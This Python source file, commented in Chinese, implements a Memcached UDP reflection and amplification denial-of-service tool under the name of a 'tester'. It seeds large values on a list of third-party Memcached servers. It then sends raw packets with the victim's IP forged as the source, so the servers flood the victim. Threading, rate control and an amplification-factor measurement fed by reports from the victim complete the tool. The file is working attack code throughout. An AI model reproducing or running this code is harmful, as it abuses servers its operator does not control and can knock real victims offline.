import logging
import os
import random
import socket
import struct
import threading
import time
import traceback
from threading import Lock
from typing import Any, Callable, Dict, List, Optional

from pymemcache.client.base import Client
from pymemcache.exceptions import MemcacheError

logger = logging.getLogger(__name__)


class MemcachedTester:
    def __init__(self) -> None:
        self.is_running: bool = False
        self.stats_callback: Optional[Callable[[Dict[str, Any]], None]] = None
        self.threads: List[threading.Thread] = []

        self.stats_lock = Lock()
        self.test_stats: Dict[str, Any] = {
            "packets_sent": 0,
            "packets_received": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "current_pps": 0,
            "current_mbps": 0,
            "victim_mbps": 0.0,
            "max_amplification_factor": 0.0,
            "progress_percent": 0
        }

        self.server_keys: Dict[str, str] = {}
        self.keys_lock = Lock()

        self.servers_file = "servers/memcached.txt"
        self.initialized_servers: List[str] = []
        
        # 远程监控（与DNS/NTP保持一致）
        self.remote_recv_mbps = 0.0
        self.remote_last_update = 0
        self.max_amplification_factor = 0.0
        self.start_time = 0
        self.end_time = 0

    def run_test(self, target_ip: str, target_port: int = 80,
                 duration_minutes: int = 5, threads: int = 8,
                 data_size_kb: int = 300, target_pps: int = 5000,
                 spoof_source_ip: Optional[str] = None,
                 spoof_source_port: int = 0,
                 stats_callback: Optional[Callable[[Dict], None]] = None) -> None:
        """
        执行 Memcached 反射攻击测试
        :param target_ip: 受害者 IP（伪造源 IP）
        :param target_port: 受害者端口（伪造源端口）
        :param duration_minutes: 持续时间（分钟）
        :param threads: 发送线程数
        :param data_size_kb: 预置数据大小（KB）
        :param target_pps: 目标每秒发送包数
        :param spoof_source_ip: 伪造源 IP（如果不提供则使用 target_ip）
        :param spoof_source_port: 伪造源端口（如果不提供则使用 target_port）
        :param stats_callback: 统计回调函数
        """
        # 兼容旧调用：未提供伪造参数时使用目标 IP/端口
        if spoof_source_ip is None:
            spoof_source_ip = target_ip
        if spoof_source_port == 0:
            spoof_source_port = target_port

        self.is_running = True
        self.stats_callback = stats_callback
        self.start_time = time.time()
        self.end_time = self.start_time + (duration_minutes * 60)

        logger.info(f"开始 Memcached 测试")
        logger.info(f"受害者（伪造源）: {spoof_source_ip}:{spoof_source_port}")
        logger.info(f"目标反射端口: 11211")

        try:
            # 加载服务器列表
            servers = self._load_servers()
            if not servers:
                logger.error("没有可用的 Memcached 服务器")
                return

            logger.info(f"加载了 {len(servers)} 个候选服务器")
            
            # 初始化服务器数据（预置大 value）
            initialized_servers = self._initialize_servers(servers, data_size_kb, target_port)
            if not initialized_servers:
                logger.error("没有服务器初始化成功，无法继续")
                return
            self.initialized_servers = initialized_servers
            logger.info(f"成功初始化 {len(initialized_servers)} 个反射服务器")

            # 优化系统（可选）
            self._optimize_system()

            # 创建原始套接字（所有线程共享）
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            except (PermissionError, OSError) as e:
                logger.error(f"创建原始套接字失败，需要 root 权限: {str(e)}")
                return

            # 清理之前的线程列表
            self.threads = []

            # 启动反馈监听线程（与 DNS/NTP 保持一致，用于接收受害机带宽汇报）
            feedback_thread = threading.Thread(target=self._feedback_listener)
            feedback_thread.daemon = True
            feedback_thread.start()
            self.threads.append(feedback_thread)

            # 启动统计更新线程
            stats_updater_thread = threading.Thread(target=self._stats_updater)
            stats_updater_thread.daemon = True
            stats_updater_thread.start()
            self.threads.append(stats_updater_thread)

            # 计算每个线程的目标 PPS
            target_pps_per_thread = max(1, target_pps // threads)

            # 启动发送工作线程
            for i in range(threads):
                t = threading.Thread(
                    target=self._send_worker,
                    args=(i, sock, spoof_source_ip, spoof_source_port,
                          self.end_time, target_pps_per_thread)
                )
                t.daemon = True
                t.start()
                self.threads.append(t)

            logger.info(f"启动 {threads} 个发送线程，目标总 PPS: {target_pps}")

            # 等待测试时间结束
            while self.is_running and time.time() < self.end_time:
                time.sleep(1)

            # 清理套接字
            sock.close()

            # 等待所有工作线程结束
            for t in self.threads:
                if t.is_alive():
                    t.join(timeout=2)

            logger.info("Memcached 测试完成")

            # 发送最终统计
            if self.stats_callback:
                final_stats = self.test_stats.copy()
                final_stats.update({
                    'victim_mbps': self.remote_recv_mbps,
                    'max_amplification_factor': self.max_amplification_factor,
                    'progress_percent': 100
                })
                self.stats_callback(final_stats)

        except Exception as e:
            logger.error(f"Memcached 测试执行错误: {str(e)}\n{traceback.format_exc()}")
            if self.stats_callback:
                self.stats_callback({'error_message': str(e)})
        finally:
            self.is_running = False

    def stop_test(self) -> None:
        """停止测试"""
        self.is_running = False
        logger.info("正在停止 Memcached 测试...")

    def _load_servers(self) -> List[str]:
        """加载 Memcached 服务器列表"""
        servers: List[str] = []
        if os.path.exists(self.servers_file):
            try:
                with open(self.servers_file, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            servers.append(line)
                logger.info(f"从 {self.servers_file} 加载了 {len(servers)} 个服务器")
            except Exception as e:
                logger.error(f"加载服务器列表失败: {str(e)}")
        else:
            logger.warning(f"服务器文件不存在: {self.servers_file}")
            # 添加一些默认服务器（通常为测试用）
            servers = ["127.0.0.1"]
        return servers

    def _initialize_servers(self, servers: List[str], data_size_kb: int, target_port: int) -> List[str]:
        """初始化服务器数据（预置大 value）"""
        data_size = data_size_kb * 1024
        results: List[str] = []
        results_lock = Lock()

        def init_server(server: str) -> Optional[str]:
            try:
                logger.debug("尝试初始化服务器: %s", server)
                client = Client(
                    (server, 11211),  # Memcached 标准端口
                    connect_timeout=5,
                    timeout=10,
                    no_delay=True,
                )
                key = f"test_{int(time.time())}_{random.randint(1000, 9999)}"
                large_value = "A" * data_size

                ok = client.set(key, large_value)
                if ok:
                    # 验证数据完整性
                    retrieved = client.get(key)
                    if retrieved and len(retrieved) == data_size:
                        with self.keys_lock:
                            self.server_keys[server] = key
                        logger.info("✅ 服务器 %s 初始化成功（%dKB）", server, data_size_kb)
                        return server
                    else:
                        actual = len(retrieved) if retrieved else 0
                        logger.warning("服务器 %s 数据验证失败: %d/%d", server, actual, data_size)
                else:
                    logger.warning("服务器 %s 设置数据失败", server)
                client.close()
            except Exception as e:
                logger.warning("服务器 %s 初始化错误: %s", server, str(e))
            return None

        # 并发初始化（限制并发数）
        init_threads: List[threading.Thread] = []
        for server in servers:
            if not self.is_running:
                break
            t = threading.Thread(target=lambda s=server: results_lock.acquire() or results.append(init_server(s)) or results_lock.release())
            t.start()
            init_threads.append(t)
            if len(init_threads) >= 10:
                for th in init_threads:
                    th.join()
                init_threads = []
        for th in init_threads:
            th.join()

        # 过滤掉 None
        return [s for s in results if s is not None]

    def _optimize_system(self):
        """优化系统网络参数（可选）"""
        try:
            os.system('ulimit -n 65536 2>/dev/null')
            os.system('sysctl -w net.core.rmem_max=67108864 2>/dev/null')
            os.system('sysctl -w net.core.wmem_max=67108864 2>/dev/null')
            logger.info("系统优化已应用")
        except:
            pass

    def _send_worker(self, worker_id: int, sock: socket.socket,
                     src_ip: str, src_port: int,
                     end_time: float, target_pps_per_thread: int):
        """发送工作线程"""
        logger.debug("Memcached 发送线程 %d 启动", worker_id)

        servers = list(self.initialized_servers)
        if not servers:
            logger.error("线程 %d 没有可用服务器", worker_id)
            return

        # 数据包缓存（按目的服务器缓存，提高效率）
        packet_cache = {}
        batch_size = max(5, min(20, target_pps_per_thread // 20))
        packet_count = 0
        local_stats = {'packets': 0, 'bytes': 0}

        while self.is_running and time.time() < end_time:
            batch_start = time.time()
            batch_packets = 0
            batch_bytes = 0

            for _ in range(batch_size):
                if not self.is_running or time.time() >= end_time:
                    break
                server = random.choice(servers)

                # 从缓存获取或构建数据包
                if server in packet_cache:
                    packet = packet_cache[server]
                else:
                    with self.keys_lock:
                        key = self.server_keys.get(server, "test_key_12345")
                    packet = self._build_memcached_packet(
                        src_ip=src_ip,
                        dst_ip=server,
                        src_port=src_port,
                        dst_port=11211,
                        key=key
                    )
                    packet_cache[server] = packet

                try:
                    sock.sendto(packet, (server, 0))
                    batch_packets += 1
                    batch_bytes += len(packet)
                except Exception as e:
                    logger.debug("线程 %d 发送失败: %s", worker_id, str(e))

            # 更新全局统计
            with self.stats_lock:
                self.test_stats['packets_sent'] += batch_packets
                self.test_stats['bytes_sent'] += batch_bytes
            packet_count += batch_packets

            # 速率控制
            batch_duration = time.time() - batch_start
            expected_duration = batch_size / max(1, target_pps_per_thread)
            if batch_duration < expected_duration:
                time.sleep(expected_duration - batch_duration)

            # 定期刷新服务器列表（动态适应）
            if packet_count % 1000 == 0:
                servers = list(self.initialized_servers)

        logger.debug("Memcached 发送线程 %d 结束，发送 %d 包", worker_id, packet_count)

    def _build_memcached_packet(self, src_ip: str, dst_ip: str,
                                 src_port: int, dst_port: int, key: str) -> bytes:
        """构造完整的 IP/UDP/Memcached 数据包"""
        # Memcached UDP 请求头（简单 get 命令）
        request_id = random.randint(0, 65535)
        memcached_header = struct.pack("!HHHH", request_id, 0x0000, 0x0001, 0x0000)
        get_command = f"get {key}\r\n".encode()

        udp_length = 8 + len(memcached_header) + len(get_command)
        ip_total_len = 20 + udp_length

        # IP 头
        ip_ver_ihl = 0x45
        ip_tos = 0
        ip_id = random.randint(0, 65535)
        ip_flags_frag = 0x4000  # DF
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0

        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(dst_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_flags_frag,
            ip_ttl, ip_proto, ip_check, src_ip_bytes, dst_ip_bytes
        )

        # UDP 头
        udp_check = 0
        udp_header = struct.pack("!HHHH", src_port, dst_port, udp_length, udp_check)

        return ip_header + udp_header + memcached_header + get_command

    def _feedback_listener(self):
        """监听受害机汇报的带宽数据（与 DNS/NTP 统一）"""
        listen_port = 9999
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', listen_port))
            sock.settimeout(2.0)
            logger.info("Memcached 反馈监听启动，端口 %d", listen_port)
        except Exception as e:
            logger.warning("无法启动反馈监听: %s", str(e))
            return

        while self.is_running:
            try:
                data, _ = sock.recvfrom(1024)
                try:
                    mbps = float(data.decode().strip())
                    with self.stats_lock:
                        self.remote_recv_mbps = mbps
                        self.remote_last_update = time.time()
                        self.test_stats['victim_mbps'] = mbps
                except:
                    pass
            except socket.timeout:
                continue
            except:
                break
        sock.close()

    def _stats_updater(self):
        """定期更新统计并回调"""
        logger.debug("Memcached 统计更新线程启动")
        last_packets = 0
        last_bytes = 0
        last_time = time.time()

        while self.is_running and time.time() < self.end_time:
            time.sleep(2)
            now = time.time()
            delta = now - last_time
            if delta <= 0:
                continue

            with self.stats_lock:
                cur_packets = self.test_stats['packets_sent']
                cur_bytes = self.test_stats['bytes_sent']
                pps = (cur_packets - last_packets) / delta
                mbps = ((cur_bytes - last_bytes) * 8) / (delta * 1_000_000)
                self.test_stats['current_pps'] = pps
                self.test_stats['current_mbps'] = mbps

                # 计算放大倍数（如果有受害机反馈）
                victim_mbps = self.remote_recv_mbps
                data_fresh = (now - self.remote_last_update) < 3.0
                if mbps > 0.1 and data_fresh and victim_mbps > 0:
                    real_af = victim_mbps / mbps
                    if real_af > self.max_amplification_factor:
                        self.max_amplification_factor = real_af
                        self.test_stats['max_amplification_factor'] = real_af

                # 进度
                elapsed = now - self.start_time
                total = self.end_time - self.start_time
                progress = min(100, (elapsed / total) * 100) if total > 0 else 0
                self.test_stats['progress_percent'] = progress

                if self.stats_callback:
                    stats_copy = self.test_stats.copy()
                    stats_copy.update({
                        'victim_mbps': victim_mbps,
                        'is_data_fresh': data_fresh,
                        'max_amplification_factor': self.max_amplification_factor,
                        'progress_percent': progress
                    })
                    self.stats_callback(stats_copy)

            last_packets = cur_packets
            last_bytes = cur_bytes
            last_time = now

        logger.debug("Memcached 统计更新线程结束")

    def get_stats(self) -> Dict[str, Any]:
        with self.stats_lock:
            return self.test_stats.copy()

    def cleanup(self) -> None:
        self.is_running = False
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=2)
        self._cleanup_servers()

    def _cleanup_servers(self) -> None:
        """清理反射服务器上预置的数据"""
        if not self.server_keys:
            return
        logger.info("清理 Memcached 服务器数据...")
        def cleanup(server, key):
            try:
                client = Client((server, 11211), timeout=5, connect_timeout=5)
                client.delete(key)
                client.close()
            except:
                pass
        threads = []
        for server, key in list(self.server_keys.items()):
            t = threading.Thread(target=cleanup, args=(server, key))
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=5)
        self.server_keys.clear()
        self.initialized_servers.clear()
        logger.info("Memcached 服务器数据清理完成")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    tester = MemcachedTester()

    def print_stats(stats):
        print(f"\r发送: {stats['packets_sent']} 包 | 速率: {stats['current_pps']:.0f} pps | "
              f"带宽: {stats['current_mbps']:.2f} Mbps | 受害机: {stats.get('victim_mbps',0):.2f} Mbps | "
              f"进度: {stats.get('progress_percent',0):.1f}%", end="")

    try:
        print("Memcached 模块单元测试")
        tester.run_test(
            target_ip="192.168.1.100",   # 受害者 IP
            target_port=80,
            duration_minutes=0.2,
            threads=2,
            data_size_kb=50,
            target_pps=500,
            spoof_source_ip="192.168.1.100",
            spoof_source_port=80,
            stats_callback=print_stats
        )
        print("\n测试结束")
    except KeyboardInterrupt:
        tester.stop_test()
    finally:
        tester.cleanup()